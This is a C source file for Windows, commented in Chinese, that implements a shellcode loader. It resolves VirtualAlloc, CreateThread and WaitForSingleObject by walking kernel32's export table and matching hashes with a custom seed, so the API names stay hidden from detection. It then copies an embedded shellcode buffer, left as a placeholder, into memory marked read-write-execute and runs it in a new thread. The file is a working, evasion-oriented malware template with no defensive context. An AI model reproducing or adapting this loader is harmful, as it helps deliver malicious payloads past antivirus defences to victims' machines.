#include <windows.h>
#include <stdio.h>

//定义函数指针类型
typedef PVOID(WINAPI* PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE(WINAPI* PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef DWORD(WINAPI* PWaitForSingleObject)(HANDLE, DWORD);

//简单哈希函数
unsigned int hash(const char* str) {
    unsigned int hash = 7759; // 使用自定义初始值
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

void main() {
    //获取kernel32.dll的句柄
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    PVirtualAlloc funcVirtualAlloc = NULL;
    PCreateThread funcCreateThread = NULL;
    PWaitForSingleObject funcWaitForSingleObject = NULL;

    //获取导出目录
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hKernel32;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hKernel32 + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)hKernel32 + pExportDirectory->AddressOfNameOrdinals);

    //遍历导出函数，计算哈希值
    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i) {
        PCSTR pFunctionName = (PSTR)((PBYTE)hKernel32 + pAddressOfNames[i]);
        unsigned int functionHash = hash(pFunctionName);

        //比较哈希值，找到匹配的函数
        if (functionHash == 0x80fa57e1) {
            funcVirtualAlloc = (PVirtualAlloc)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        else if (functionHash == 0xc7d73c9b) {
            funcCreateThread = (PCreateThread)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
        else if (functionHash == 0x50c272c4) {
            funcWaitForSingleObject = (PWaitForSingleObject)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }

    //使用找到的函数指针执行代码
    unsigned char shellcode[] = "[Shellcode]"; //嵌入Shellcode
    PVOID shellcode_exec = funcVirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcode_exec, shellcode, sizeof(shellcode));
    DWORD threadID;
    HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    funcWaitForSingleObject(hThread, INFINITE);
}
